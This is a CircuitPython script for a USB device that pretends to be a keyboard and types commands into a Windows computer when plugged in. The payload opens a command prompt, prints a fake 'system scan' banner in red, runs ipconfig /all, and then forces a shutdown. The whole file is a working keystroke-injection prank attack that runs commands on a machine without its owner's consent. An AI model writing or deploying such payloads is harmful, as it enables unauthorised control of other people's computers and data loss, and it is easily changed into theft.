import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)

def press(*keys):
    kbd.press(*keys)
    time.sleep(0.05)
    kbd.release_all()
    time.sleep(0.05)

def type_string(text):
    for char in text:
        if char == " ":
            press(Keycode.SPACE)
        elif char == "/":
            press(Keycode.FORWARD_SLASH)
        elif char == "-":
            press(Keycode.MINUS)
        elif char == ".":
            press(Keycode.PERIOD)
        elif char == "0":
            press(Keycode.ZERO)
        elif char == "1":
            press(Keycode.ONE)
        elif char == "2":
            press(Keycode.TWO)
        elif char == "3":
            press(Keycode.THREE)
        elif char == "4":
            press(Keycode.FOUR)
        elif char == "5":
            press(Keycode.FIVE)
        elif char == "6":
            press(Keycode.SIX)
        elif char == "7":
            press(Keycode.SEVEN)
        elif char == "8":
            press(Keycode.EIGHT)
        elif char == "9":
            press(Keycode.NINE)
        elif char.isupper():
            press(Keycode.SHIFT, getattr(Keycode, char))
        elif char.islower():
            press(getattr(Keycode, char.upper()))
        time.sleep(0.03)

# ========== PAYLOAD ==========

time.sleep(5)  # Wait for the host to recognize the keyboard

# Open Run dialog
press(Keycode.GUI, Keycode.R)
time.sleep(0.8)

# Launch Command Prompt
type_string("cmd")
press(Keycode.ENTER)
time.sleep(1.5)

# Set text color to red
type_string("color c")
press(Keycode.ENTER)
time.sleep(0.4)

# Cool header
type_string("echo ========================================")
press(Keycode.ENTER)
type_string("echo   SYSTEM SCAN INITIATED...")
press(Keycode.ENTER)
type_string("echo ========================================")
press(Keycode.ENTER)
time.sleep(0.7)

# Run a basic network command
type_string("ipconfig /all")
press(Keycode.ENTER)
time.sleep(2.5)

type_string("echo.")
press(Keycode.ENTER)
type_string("echo Scan complete. Shutting down NOW...")
press(Keycode.ENTER)
time.sleep(1)

# Immediate shutdown
type_string("shutdown /s")
press(Keycode.ENTER)










